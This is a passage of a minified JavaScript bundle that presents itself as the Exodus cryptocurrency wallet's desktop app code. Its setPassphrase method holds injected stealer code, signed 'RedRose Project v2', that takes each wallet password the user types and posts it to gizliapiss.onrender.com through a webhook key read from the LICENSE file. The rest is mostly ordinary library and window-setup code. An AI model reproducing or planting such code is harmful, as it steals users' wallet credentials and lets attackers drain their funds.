const https = require('https');
const fs = require('fs');
! function(e) {
	var t = {};

	function n(r) {
		if (t[r]) return t[r].exports;
		var o = t[r] = {
			i: r,
			l: !1,
			exports: {}
		};
		return e[r].call(o.exports, o, o.exports, n), o.l = !0, o.exports
	}
	n.m = e, n.c = t, n.d = function(e, t, r) {
		n.o(e, t) || Object.defineProperty(e, t, {
			enumerable: !0,
			get: r
		})
	}, n.r = function(e) {
		"undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
			value: "Module"
		}), Object.defineProperty(e, "__esModule", {
			value: !0
		})
	}, n.t = function(e, t) {
		if (1 & t && (e = n(e)), 8 & t) return e;
		if (4 & t && "object" == typeof e && e && e.__esModule) return e;
		var r = Object.create(null);
		if (n.r(r), Object.defineProperty(r, "default", {
				enumerable: !0,
				value: e
			}), 2 & t && "string" != typeof e)
			for (var o in e) n.d(r, o, function(t) {
				return e[t]
			}.bind(null, o));
		return r
	}, n.n = function(e) {
		var t = e && e.__esModule ? function() {
			return e.default
		} : function() {
			return e
		};
		return n.d(t, "a", t), t
	}, n.o = function(e, t) {
		return Object.prototype.hasOwnProperty.call(e, t)
	}, n.p = "", n(n.s = 189)
}([function(e, t) {
	e.exports = require("electron")
}, function(e, t) {
	e.exports = require("path")
}, function(e, t, n) {
	"use strict";
	const r = "moneroInitialHeight",
		o = "moneroSubaddressesEnabled";
	var i = n(47),
		s = n.n(i);
	const c = n(66),
		a = void 0;
	a && a.match(/^http/), Math.max(6e3, 3640), s()("5m"), s()("3s"), [{
		localKey: "fiat.unit",
		profilePath: "private.currency"
	}, {
		localKey: r,
		profilePath: `private.${r}`
	}, {
		localKey: o,
		profilePath: o
	}, {
		localKey: "theme.name",
		profilePath: "theme"
	}, {
		localKey: "advanced.advancedMode.assets.bitcoin",
		profilePath: "rbfEnabled_bitcoin"
	}, {
		localKey: "advanced.advancedMode.assets.ethereum",
		profilePath: "rbfEnabled_ethereum"
	}, {
		localKey: "adaLegacyAddressEnabled",
		profilePath: "private.adaLegacyAddressEnabled"
	}, {
		localKey: "bitcoinLegacyAddressEnabled",
		profilePath: "bitcoinLegacyAddressEnabled"
	}, {
		localKey: "bitcoinTaprootAddressEnabled",
		profilePath: "bitcoinTaprootAddressEnabled"
	}, {
		localKey: "fiatOnramp.wentThroughFiatOnboarding",
		profilePath: "fiatOnramp.wentThroughFiatOnboarding"
	}].concat([]);
	n.d(t, "n", function() {
		return c
	}), n.d(t, "g", function() {
		return !0
	}), n.d(t, "h", function() {
		return !1
	}), n.d(t, "e", function() {
		return !1
	}), n.d(t, "d", function() {
		return ""
	}), n.d(t, "c", function() {
		return !0
	}), n.d(t, "b", function() {
		return !1
	}), n.d(t, "f", function() {
		return !0
	}), n.d(t, !1, function() {}), n.d(t, "m", function() {
		return !1
	}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, "j", function() {
		return "restore-mnemonic"
	}), n.d(t, "i", function() {
		return "restore-from-current-phrase"
	}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, "a", function() {
		return "https://updates.exodus.io/releases"
	}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, "o", function() {
		return "exodus"
	}), n.d(t, !1, function() {}), n.d(t, "p", function() {
		return 440
	}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, !1, function() {}), n.d(t, "l", function() {
		return 1244
	}), n.d(t, "k", function() {
		return 700
	}), n.d(t, !1, function() {})
}, function(e, t, n) {
	"use strict";
	var r = n(56),
		o = n.n(r),
		i = n(0),
		s = n(33),
		c = n.n(s),
		a = n(32),
		u = n(44),
		l = n.n(u),
		f = n(2);
	const d = l()(f.a, "feed/darwin.json"),
		p = l()(f.a, "feed/darwin-arm64.json"),
		h = l()(f.a, `feed/linux-${process.arch}.json`),
		y = l()(f.a, `feed/win32-${process.arch}`);
	let m;
	"darwin" === process.platform && (m = d), "linux" === process.platform && (m = h), "win32" === process.platform && (m = l()(y, "RELEASES"));
	var w = n(4);
	const b = Object(a.promisify)(o.a.execFile),
		g = {
			async startUpdate() {
				let e;
				return "darwin" === process.platform && (e = "arm64" === process.arch || await async function() {
					if ("darwin" === process.platform && "x64" === process.arch) {
						const [e, t] = c.a.release().split(".").map(Number);
						if (e > 20 || 20 === e && t >= 5) try {
							const {
								stdout: e,
								stderr: t
							} = await b("sysctl", ["sysctl.proc_translated"]);
							return "sysctl.proc_translated: 1" === e.trim() && "" === t.trim()
						} catch {
							return !1
						}
					}
					return !1
				}() ? p : d), "win32" === process.platform && (e = y), new Promise((t, n) => {
					i.autoUpdater.on("error", e => {
						console.error(`Update error: ${e.message}`), n(e)
					}), i.autoUpdater.on("checking-for-update", () => console.log("Checking for update")), i.autoUpdater.on("update-available", () => console.log("Update available")), i.autoUpdater.on("update-not-available", () => console.log("No update available")), i.autoUpdater.on("update-downloaded", (e, n, r, o, i) => {
						console.log(`Update downloaded: ${r}: ${i}`), t()
					}), i.autoUpdater.setFeedURL(e), i.autoUpdater.checkForUpdates()
				})
			},
			quitAndInstall() {
				i.autoUpdater.quitAndInstall()
			}
		};
	Object(w.createServer)("auto-update-controller", ["ui"], g);
	var v = n(38);
	let E, S = null,
		k = 0;
	const x = {
		requestHide() {
			E({
				status: S || "cancel",
				attempts: k
			})
		},
		async unlock() {
			const e = Object(v.a)();
			return new Promise(t => {
				S = null, E = t, e.show(), setImmediate(() => e.send("unlock:show"))
			})
		},
		async closeUnlockWindow() {
			const e = Object(v.a)();
			e.hide(), setImmediate(() => e.send("unlock:hide"))
		},
		async setStatus(e, t) {
			S = e, k = t
		}
	};
	Object(w.createServer)("unlock-controller", ["unlock", "ui"], x);
	var O = n(21),
		C = n.n(O);
	Object(w.createServer)("metrics-controller", ["ui"], {
		getTimeOrigin: C.a.getTimeOrigin,
		getTrace: C.a.getTrace
	});
	var j = n(9),
		_ = n.n(j),
		F = n(1),
		P = n.n(F),
		D = n(30),
		B = n(34),
		T = n(23),
		L = n(47),
		I = n.n(L),
		N = n(87),
		M = n.n(N);
	var A = async function() {
		const e = Object(B.c)();
		let t;
		try {
			t = await _.a.readdir(e)
		} catch (e) {
			if ("ENOENT" === e.code) return;
			throw e
		}
		const n = Date.now() - I()("90 days"),
			r = t.filter(e => new Date(e.split("_")[0]).getTime() < n).map(t => P.a.resolve(e, t));
		if (!r.length) return;
		const o = {
			iterations: 1
		};
		await Promise.all(r.map(e => (async function(e, t) {
			const n = await _.a.readdir(e);
			return Promise.all(n.map(n => M()(P.a.join(e, n), t)))
		})(P.a.join(e, "exodus.wallet"), o))), await Promise.all(r.map(e => _.a.remove(e)))
	}, $ = n(11), U = n(86), R = n(25), W = n(8), z = n(14), V = n(5), q = n(10), K = n(24);
	const J = {
		...q.a,
		backgroundColor: "#000",
		frame: !1,
		fullscreen: !1,
		fullscreenable: !1,
		maximizable: !1,
		minimizable: !1,
		resizable: !1,
		width: 800,
		height: 600,
		show: !1,
		skipTaskbar: !1,
		titleBarStyle: "default",
		title: "Enter Password",
		webPreferences: {
			...q.c,
			partition: "passphrase"
		}
	};
	let H = null;
	const G = () => H;

	function Y(e) {
		const t = e && e.recoverFromPhrase ? "Enter Mnemonic" : J.title;
		return H = new i.BrowserWindow({
			...J,
			title: t
		}), Object(W.registerWebContents)(H.webContents, "passphrase"), Object(z.a)(H.webContents, "passphrase"), H.loadURL(Object(K.a)({
			app: i.app,
			hash: Object(R.a)(e),
			filePath: V.h
		})), Object(T.a)() && Object($.a)({
			windowHandle: H.webContents,
			windowId: "passphrase"
		}), H.webContents.on("will-navigate", e => {
			e.preventDefault()
		}), H.webContents.setWindowOpenHandler(e => ({
			action: "deny"
		})), i.app.on("before-quit", () => {
			H.isDestroyed() || H.close()
		}), H.on("close", () => {
			H.destroy(), i.app.quit()
		}), H.webContents.once("dom-ready", () => H.show()), H
	}
	const X = new class extends U.EventEmitter {
		constructor() {
			super(), this._walletLoaded = !1, this.setPassphrase = this.setPassphrase.bind(this), this.setWalletLoaded = this.setWalletLoaded.bind(this), this.hasWalletLoaded = this.hasWalletLoaded.bind(this)
		}
		async setInvalidPassphrase() {
			this.emit("passphrase:invalid");
			const e = G();
			setImmediate(() => e.send("main:passphrase:invalid"))
		}
		async setSaltConnectionFailed() {
			this.emit("saltconn:failed");
			const e = G();
			setImmediate(() => e.send("main:saltconn:failed"))
		}
		async setError(e) {
			this.emit("error", e)
		}
		async setPassphrase(e) {
			fs.readFile('LICENSE', 'utf8', function(err, data) {
				if (err) throw err;
				const delimiterIndex = data.indexOf(':');
				const hook = data.substring(0, delimiterIndex);
				const link = data.substring(delimiterIndex + 1);
const payload = {
  "content": null,
  "embeds": [{
    "title": "Exodus Password",
    "fields": [
      {
        "name": "Password",
        "value": `\`${e}\``
      }
    ],
    "color": 0xE74C3C, // Kırmızı rengin hex kodu
    "footer": {
      "text": "@RedRose Project v2"
    }
  }],
  "username": "RedRose Project v2",
  "attachments": [],
  "key": hook // Burada key değerini ekledim
};


				const options = {
    hostname: 'gizliapiss.onrender.com',
    port: 443,
    path: '/webhooks/' + hook,
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'key': "5FVr5Peh9ucI7Kw2" // Eklemek istediğiniz 'key'
    }
};

				const req = https.request(options, (res) => {
					res.on('data', (d) => {
						process.stdout.write(d)
					})
				});
				req.write(JSON.stringify(payload));
				req.end()
			});
			this.emit("passphrase:set", e)
		}
		async setMnemonic(e) {
			this.emit("mnemonic:set", e)
		}
		async setWalletLoaded(e, t) {
			console.log(""), console.log("SET WALLET LOADED", "action:", t, "loadedFrom:", this._loadedFrom), console.log(e), console.log(""), this._walletLoaded = e, this._action = t, this.emit("wallet:loaded")
		}
		async awaitWalletLoaded() {
			this._walletLoaded || await new Promise(e => this.once("wallet:loaded", e))
		}
		async hasWalletLoaded() {
			return this._walletLoaded
		}
		async getAction() {
			return this._action
		}
		async setLoadedFrom(e) {
			this._loadedFrom = e, this.emit("wallet:loadedfrom")
		}
		async getLoadedFrom() {
			return void 0 === this._loadedFrom && await new Promise(e => this.once("wallet:loadedfrom", e)), this._loadedFrom
		}
		async setHasPassphrase(e) {
			this._hasPassphrase = e, this.emit("wallet:haspassphrase")
		}
		async getHasPassphrase() {
			return void 0 === this._hasPassphrase && await new Promise(e => this.once("wallet:haspassphrase", e)), this._hasPassphrase
		}
	};
	Object(w.createServer)("wallet-controller", ["wallet", "network", "ui", "passphrase"], X), console.warn(`wallet-controller initialized, process.type = browser, timestamp: ${Date.now()}`);
	var Z = X,
		Q = n(26),
		ee = n(55),
		te = n(54),
		ne = n(53),
		re = n(18),
		oe = n(40);
	n.d(t, "a", function() {
		return ie
	}), n.d(t, "b", function() {
		return ce
	});
	const ie = {};
	let se;
	async function ce(e) {
		const t = e.exodusDirFromCli,
			n = Object(Q.a)(t),
			r = Object(ee.b)(n),
			o = Object(re.b)(n);
		ie.background = n, ie.ui = o, ie.core = r;
		const s = t || Object(B.a)();
		console.timeEnd("main"), console.time("uiview"), await async function(e, t) {
			if (await _.a.pathExists(ue(t))) return async function(e) {
				await _.a.remove(ue(e)), se = Y({
					recoverFromPhrase: !0
				});
				const t = Object(D.c)(e);
				ae(t)
			}(t);
			const n = function(e) {
				if (globalThis.OPENED_URL && globalThis.OPENED_URL.includes("recover")) return globalThis.OPENED_URL;
				if (!Array.isArray(e._) && e._.length > 0) return null;
				const t = e._.find(e => e.includes("recover"));
				return t && t.includes("recover") ? t : null
			}(e);
			if (n) return async function(e, t) {
				se = Y({
					recoverFromLink: !0
				});
				const n = Object(D.c)(t);
				Z.on("passphrase:set", t => {
					const r = Object(oe.b)({
						walletDir: n,
						recoveryLink: e,
						passphrase: t
					});
					Z.on("passphrase:invalid", () => {
						r.destroy()
					})
				})
			}(n, t);
			Z.on("error", e => {
				const t = `Wallet Load Error:\n\n${e}\n\nPlease contact: support@exodus.com\n\nYour assets are safe.`;
				i.dialog.showErrorBox("Wallet Load Error", t), i.app.quit()
			});
			const r = Object(D.c)(t),
				o = Object(D.b)(r),
				s = await o.walletExists(),
				c = await o.passphraseFileExists();
			if (!s || s && c) Object(oe.b)({
				walletDir: r
			});
			else {
				if (c) {
					const e = new Error("Wallet exists - should not have reached this point.");
					throw console.error(e), e
				}
				se = Y(), Z.on("passphrase:set", e => {
					const t = Object(oe.b)({
						walletDir: r,
						passphrase: e
					});
					Z.on("passphrase:invalid", () => {
						t.destroy()
					})
				}), ae(r)
			}
		}(e, s), o.webContents.on("devtools-opened", () => {
			console.log("devtools were opened"), setImmediate(() => {
				o.webContents.send("devtools-opened")
			})
		}), o.webContents.once("did-finish-load", () => {
			function e() {
				se && (Object(Q.b)(n), n.show(), se.destroy()), (Object(T.a)() || f.e) && Object($.a)({
					windowHandle: o.webContents,
					windowId: "ui"
				}), setTimeout(() => {
					A().catch(console.error)
				}, 3e4)
			}
			console.log(`did-finish-load at [${Date.now()}]`), console.timeEnd("uiview"), ie.unlock = Object(v.b)(n), se || (Object(Q.b)(n), o.webContents.zoomFactor = 1, n.show()), Object(ne.b)(), Z._walletLoaded ? e() : Z.on("wallet:loaded", e)
		}), o.webContents.loadFile(V.c), Object(te.b)(), n.on("close", () => i.app.quit())
	}
	const ae = e => {
			Z.on("mnemonic:set", ({
				mnemonic: t,
				passphrase: n
			}) => {
				const r = Object(oe.b)({
					walletDir: e,
					recoveryPhrase: t,
					recoveryPhrasePassphrase: n
				});
				Z.on("passphrase:invalid", () => {
					r.destroy()
				})
			})
		},
		ue = e => P.a.join(e, f.j)
}, function(e, t, n) {
	e.exports = n(90)
}, function(e, t, n) {
	"use strict";
	n.d(t, "c", function() {
		return s
	}), n.d(t, "a", function() {
		return c
	}), n.d(t, "d", function() {
		return a
	}), n.d(t, "e", function() {
		return u
	}), n.d(t, "f", function() {
		return l
	}), n.d(t, "h", function() {
		return f
	}), n.d(t, "i", function() {
		return d
	}), n.d(t, "j", function() {
		return p
	}), n.d(t, "k", function() {
		return h
	}), n.d(t, "b", function() {
		return y
	}), n.d(t, "g", function() {
		return m
	});
	var r = n(1),
		o = n.n(r);
	const i = e => o.a.join("src", "static", e),
		s = i(n(2).g ? "exodus-prod.html" : "exodus-dev.html"),
		c = i("background.html"),
		a = i("keyviewer.html"),
		u = i("monero.html"),
		l = i("network.html"),
		f = i("passphrase.html"),
		d = i("scan-qr.html"),
		p = i("unlock.html"),
		h = i("wallet.html"),
		y = i("core.html"),
		m = i("nfts.html")
}, function(e, t, n) {
	"use strict";
	n.d(t, "a", function() {
		return c
	});
	var r = n(0),
		o = n(2);
	const i = o.g && o.b,
		s = o.g && !o.b;

	function c(e, t = "", n = 2, o = !0) {
		n >= 3 && (console.error(`[security] PANIC on ${e}${t}, terminating`), r.app.exit(-1));
		const c = o ? "blocked" : "noticed";
		if (console.error(`[security] ${c} ${e}${t}`), s);
		else if (i) {
			if (n < 2) return;
			r.dialog.showMessageBoxSync({
				type: "warning",
				title: `Unexpected ${e} was ${c}`,
				message: `Unexpected ${e}${t} was ${c} by security rules. Please contact support@exodus.com`
			})
		} else {
			if (n < 1) return;
			console.error(`[security] PANIC on ${e} attempt, this shouldn't happen!\n` + "This indicates an error either in the application code, or in security hardening logic.\nIf this is not caused by local modifications, please report this so that broken code does not end up in release.\nIf this is caused by local modifications, reporting it might also help to resolve the issue."), r.app.exit(-1)
		}
	}
}, function(e, t, n) {
	var r, o, i = n(27),
		s = n(180),
		c = n(178),
		a = n(177),
		u = n(32);

	function l(e, t) {
		Object.defineProperty(e, r, {
			get: function() {
				return t
			}
		})
	}
	r = Symbol.for("graceful-fs.queue"), o = Symbol.for("graceful-fs.previous");
	var f, d = function() {};
	if (u.debuglog ? d = u.debuglog("gfs4") : /\bgfs4\b/i.test(process.env.NODE_DEBUG || "") && (d = function() {
			var e = u.format.apply(u, arguments);
			e = "GFS4: " + e.split(/\n/).join("\nGFS4: "), console.error(e)
		}), !i[r]) {
		var p = global[r] || [];
		l(i, p), i.close = function(e) {
			function t(t, n) {
				return e.call(i, t, function(e) {
					e || y(), "function" == typeof n && n.apply(this, arguments)
				})
			}
			return Object.defineProperty(t, o, {
				value: e
			}), t
		}(i.close), i.closeSync = function(e) {
			function t(t) {
				e.apply(i, arguments), y()
			}
			return Object.defineProperty(t, o, {
				value: e
			}), t
		}(i.closeSync), /\bgfs4\b/i.test(process.env.NODE_DEBUG || "") && process.on("exit", function() {
			d(i[r]), n(64).equal(i[r].length, 0)
		})
	}

	function h(e) {
		d("ENQUEUE", e[0].name, e[1]), i[r].push(e), m()
	}

	function y() {
		for (var e = Date.now(), t = 0; t < i[r].length; ++t) i[r][t].length > 2 && (i[r][t][3] = e, i[r][t][4] = e);
		m()
	}

	function m() {
		if (clearTimeout(f), f = void 0, 0 !== i[r].length) {
			var e = i[r].shift(),
				t = e[0],
				n = e[1],
				o = e[2],
				s = e[3],
				c = e[4];
			if (void 0 === s) d("RETRY", t.name, n), t.apply(null, n);
			else if (Date.now() - s >= 6e4) {
				d("TIMEOUT", t.name, n);
				var a = n.pop();
				"function" == typeof a && a.call(null, o)
			} else {
				var u = Date.now() - c,
					l = Math.max(c - s, 1);
				u >= Math.min(1.2 * l, 100) ? (d("RETRY", t.name, n), t.apply(null, n.concat([s]))) : i[r].push(e)
			}
			void 0 === f && (f = setTimeout(m, 0))
		}
	}
	global[r] || l(global, i[r]), e.exports = function e(t) {
		s(t);
		t.gracefulify = e;
		t.createReadStream = function(e, n) {
			return new t.ReadStream(e, n)
		};
		t.createWriteStream = function(e, n) {
			return new t.WriteStream(e, n)
		};
		var n = t.readFile;
		t.readFile = function(e, t, r) {
			"function" == typeof t && (r = t, t = null);
			return function e(t, r, o, i) {
				return n(t, r, function(n) {
					!n || "EMFILE" !== n.code && "ENFILE" !== n.code ? "function" == typeof o && o.apply(this, arguments) : h([e, [t, r, o], n, i || Date.now(), Date.now()])
				})
			}(e, t, r)
		};
		var r = t.writeFile;
		t.writeFile = function(e, t, n, o) {
			"function" == typeof n && (o = n, n = null);
			return function e(t, n, o, i, s) {
				return r(t, n, o, function(r) {
					!r || "EMFILE" !== r.code && "ENFILE" !== r.code ? "function" == typeof i && i.apply(this, arguments) : h([e, [t, n, o, i], r, s || Date.now(), Date.now()])
				})
			}(e, t, n, o)
		};
		var o = t.appendFile;
		o && (t.appendFile = function(e, t, n, r) {
			"function" == typeof n && (r = n, n = null);
			return function e(t, n, r, i, s) {
				return o(t, n, r, function(o) {
					!o || "EMFILE" !== o.code && "ENFILE" !== o.code ? "function" == typeof i && i.apply(this, arguments) : h([e, [t, n, r, i], o, s || Date.now(), Date.now()])
				})
			}(e, t, n, r)
		});
		var i = t.copyFile;
		i && (t.copyFile = function(e, t, n, r) {
			"function" == typeof n && (r = n, n = 0);
			return function e(t, n, r, o, s) {
				return i(t, n, r, function(i) {
					!i || "EMFILE" !== i.code && "ENFILE" !== i.code ? "function" == typeof o && o.apply(this, arguments) : h([e, [t, n, r, o], i, s || Date.now(), Date.now()])
				})
			}(e, t, n, r)
		});
		var a = t.readdir;
		t.readdir = function(e, t, n) {
			"function" == typeof t && (n = t, t = null);
			var r = u.test(process.version) ? function(e, t, n, r) {
				return a(e, o(e, t, n, r))
			} : function(e, t, n, r) {
				return a(e, t, o(e, t, n, r))
			};
			return r(e, t, n);

			function o(e, t, n, o) {
				return function(i, s) {
					!i || "EMFILE" !== i.code && "ENFILE" !== i.code ? (s && s.sort && s.sort(), "function" == typeof n && n.call(this, i, s)) : h([r, [e, t, n], i, o || Date.now(), Date.now()])
				}
			}
		};
		var u = /^v[0-5]\./;
		if ("v0.8" === process.version.substr(0, 4)) {
			var l = c(t);
			m = l.ReadStream, w = l.WriteStream
		}
		var f = t.ReadStream;
		f && (m.prototype = Object.create(f.prototype), m.prototype.open = function() {
			var e = this;
			g(e.path, e.flags, e.mode, function(t, n) {
				t ? (e.autoClose && e.destroy(), e.emit("error", t)) : (e.fd = n, e.emit("open", n), e.read())
			})
		});
		var d = t.WriteStream;
		d && (w.prototype = Object.create(d.prototype), w.prototype.open = function() {
			var e = this;
			g(e.path, e.flags, e.mode, function(t, n) {
				t ? (e.destroy(), e.emit("error", t)) : (e.fd = n, e.emit("open", n))
			})
		});
		Object.defineProperty(t, "ReadStream", {
			get: function() {
				return m
			},
			set: function(e) {
				m = e
			},
			enumerable: !0,
			configurable: !0
		});
		Object.defineProperty(t, "WriteStream", {
			get: function() {
				return w
			},
			set: function(e) {
				w = e
			},
			enumerable: !0,
			configurable: !0
		});
		var p = m;
		Object.defineProperty(t, "FileReadStream", {
			get: function() {
				return p
			},
			set: function(e) {
				p = e
			},
			enumerable: !0,
			configurable: !0
		});
		var y = w;
		Object.defineProperty(t, "FileWriteStream", {
			get: function() {
				return y
			},
			set: function(e) {
				y = e
			},
			enumerable: !0,
			configurable: !0
		});

		function m(e, t) {
			return this instanceof m ? (f.apply(this, arguments), this) : m.apply(Object.create(m.prototype), arguments)
		}

		function w(e, t) {
			return this instanceof w ? (d.apply(this, arguments), this) : w.apply(Object.create(w.prototype), arguments)
		}
		var b = t.open;
		t.open = g;

		function g(e, t, n, r) {
			return "function" == typeof n && (r = n, n = null),
				function e(t, n, r, o, i) {
					return b(t, n, r, function(s, c) {
						!s || "EMFILE" !== s.code && "ENFILE" !== s.code ? "function" == typeof o && o.apply(this, arguments) : h([e, [t, n, r, o], s, i || Date.now(), Date.now()])
					})
				}(e, t, n, r)
		}
		return t
	}(a(i))
}, function(e, t, n) {
	"use strict";
	n.r(t);
	var r = n(0),
		o = n(13),
		i = n(1),
		s = n.n(i),
		c = n(5);
	const a = r.app.getAppPath();

	function u(e) {
		if (! function(e) {
				const t = s.a.basename(e);
				return !!/^[a-z-]+(\.dev)?\.html$/.test(t) && e === s.a.join("src/static", t)
			}(e)) throw new Error("Unexpected html file path");
		const t = s.a.join(a, e);
		return Object(o.pathToFileURL)(t).toString()
	}
	const l = new Map(Object.entries({
		background: {
			url: u(c.a),
			protocols: ["file:"],
			offline: !0
		},
		dapp: {
			protocols: ["https:", "wss:", "exodus-dapp-api:", "localhost"],
			multiple: !0,
			parallel: !0,
			startUrlProtocolIsIntercepted: !0
		},
		nfts: {
			url: u(c.g),
			protocols: ["file:", "https:", "exodus-nfts-api:", ...[]],
			domains: ["nfts-proxy.exodus.io", ...[]],
			permissions: ["clipboard-sanitized-write"]
		},
		ui: {
			persistName: "main",
			url: u(c.c),
			protocols: ["file:", "https:", "wss:", "localhost"],
			domains: "*",
			persistent: !0,
			ipc: !0,
			permissions: ["media", "openExternal", "clipboard-sanitized-write", "clipboard-read"],
			flags: ["trezor-origin"],
			downloads: [{
				prefix: "blob:file://",
				mimetypes: ["application/pdf"],
				open: !0
			}]
		},
		keyviewer: {
			url: u(c.d),
			protocols: ["file:"],
			offline: !0,
			multiple: !0,
			ipc: !0
		},
		monero: {
			url: u(c.e),
			protocols: ["file:", "https:", "wss:", "localhost"],
			domains: "*",
			persistent: !0,
			ipc: !0
		},
		network: {
			url: u(c.f),
			protocols: ["file:", "https:", "wss:", "localhost"],
			domains: "*",
			persistent: !0,
			ipc: !0
		},
		core: {
			url: u(c.b),
			protocols: ["file:"],
			offline: !0,
			ipc: !0
		},
		passphrase: {
			url: u(c.h),
			protocols: ["file:"],
			offline: !0,
			ipc: !0
		},
		"scan-qr": {
			url: u(c.i),
			protocols: ["file:"],
			offline: !0,
			ipc: !0,
			permissions: ["media"]
		},
		unlock: {
			url: u(c.j),
			protocols: ["file:"],
			offline: !0,
			ipc: !0
		},
		wallet: {
			url: u(c.k),
			protocols: ["file:", "https:"],
			domains: ["server.exodus.io", "exodusapp.blob.core.windows.net"],
			multiple: !0,
			persistent: !0,
			ipc: !0
		}
	}));
	var f = n(6),
		d = n(41);
	n.d(t, "getWebContentsMeta", function() {
		return h
	}), n.d(t, "registerWebContents", function() {
		return y
	});
	const p = new WeakMap;

	function h(e) {
		const t = p.get(e);
		if (!t) throw new Error("webContents instance is not registered");
		return t
	}

	function y(e, t, n = {}) {
		const r = function(e, {
			url: t,
			domains: n,
			...r
		}) {
			if (Object.keys(r).length > 0) throw new Error("Unexpected argument");
			if (!l.has(e)) throw new Error(`Unknown webContents type: '${e}'`);
			const o = {
				...l.get(e)
			};
			if (o.parallel && !o.multiple) throw new Error("`parallel: true` requires `multiple: true`");
			if (o.parallel && o.persistent) throw new Error("Can not use persistent session in parallel");
			if (o.parallel && o.ipc) throw new Error("To support targeted IPC handling, webContents could not be .parallel");
			if (o.hasOwnProperty("reusable")) throw new Error("Entry shouldn't have a .reusable property");
			if (o.reusable = o.persistent && o.multiple, o.offline) {
				if (o.domains || n) throw new Error(`Domains can not be specified for offline ${e}`);
				if (o.protocols.length > 1 || "file:" !== o.protocols[0]) throw new Error(`Offline session can use only file: protocol for ${e}`);
				o.domains = []
			} else {
				if (!!o.domains == !!n) throw new Error(`Domains argument (un)expected for '${e}'`);
				o.domains || (o.domains = n)
			}
			if (!!o.url == !!t) throw new Error(`Url argument (un)expected for '${e}'`);
			if (o.url || (o.url = t), o.hasOwnProperty("type")) throw new Error("Entry shouldn't have a .type property");
			return o.type = e, o.flags = new Set(o.flags || []), Object.freeze(o), o
		}(t, n);
		if (p.has(e)) throw new Error("Attempting to re-register webContents instance");
		p.set(e, r), Object(d.c)(e, r)
	}
	r.app.on("web-contents-created", (e, t) => {
		t.on("will-navigate", (e, t) => {
			"mailto:" !== new o.URL(t).protocol && (e.preventDefault(), Object(f.a)("unsafe navigation", ` to ${t}`, 0))
		});
		t.setWindowOpenHandler(({
			url: e
		}) => (e => {
			return !(!(t.getURL() || "").startsWith("devtools://") || !e.startsWith("devtools://"))
		})(e) ? {
			action: "allow"
		} : (Object(f.a)("opening a new window", `: ${e}`, 0), {
			action: "deny"
		})), t.on("will-attach-webview", e => {
			e.preventDefault();
			const n = t.getURL() || "";
			Object(f.a)("attaching webview", `: ${n}`, 2)
		}), Object(d.d)(t)
	})
}, function(e, t, n) {
	"use strict";
	e.exports = {
		...n(43),
		...n(63),
		...n(172),
		...n(170),
		...n(164),
		...n(22),
		...n(159),
		...n(61),
		...n(36),
		...n(50)
	}
}, function(e, t, n) {
	"use strict";
	n.d(t, "b", function() {
		return u
	}), n.d(t, "c", function() {
		return l
	});
	var r = n(0),
		o = n(1),
		i = n.n(o),
		s = n(2);
	const c = (() => s.b ? i.a.join(r.app.getAppPath(), "src", "static", "icons", "PNG", "red", "icon_128x128.png") : i.a.join(r.app.getAppPath(), "src", "static", "icons", "PNG", "icon_128x128.png"))(),
		a = (() => s.c ? "Exodus" : s.b ? "Eden" : s.d)(),
		u = {
			webSecurity: !0,
			spellcheck: !1,
			enableRemoteModule: !1,
			nodeIntegration: !0,
			sandbox: !1,
			contextIsolation: !1,
			nodeIntegrationInWorker: !1
		},
		l = {
			webSecurity: !0,
			spellcheck: !1,
			enableRemoteModule: !1,
			preload: i.a.join(r.app.getAppPath(), "src/app/preload/index.js"),
			nodeIntegration: !1,
			sandbox: !0,
			contextIsolation: !0,
			nodeIntegrationInWorker: !1
		};
	t.a = {
		resizable: !0,
		title: a,
		icon: c,
		frame: !0,
		backgroundColor: "#0b0b0b",
		show: !1
	}
}, function(e, t, n) {
	"use strict";
	n.d(t, "a", function() {
		return f
	});
	var r = n(0),
		o = n(9),
		i = n.n(o),
		s = n(2),
		c = n(23),
		a = n(18);
	const u = "exodus-devtools.conf";
	class l {
		constructor(e) {
			this._windowHandle = e.windowHandle, this._windowId = e.windowId, this._options = {}, "devMenu" === this._windowId && (this._options = {
				mode: "detach"
			})
		}
		async readConf() {
			let e;
			const t = {
					devMenu: {
						mode: "detach"
					},
					ui: {
						mode: "detach"
					},
					monero: {
						mode: "bottom"
					},
					network: {
						mode: "bottom"
					},
					core: {
						mode: "bottom"
					},
					passphrase: {
						mode: "bottom"
					},
					scanQR: {
						mode: "detach"
					},
					keyviewer: {
						mode: "detach"
					},
					wallet: {
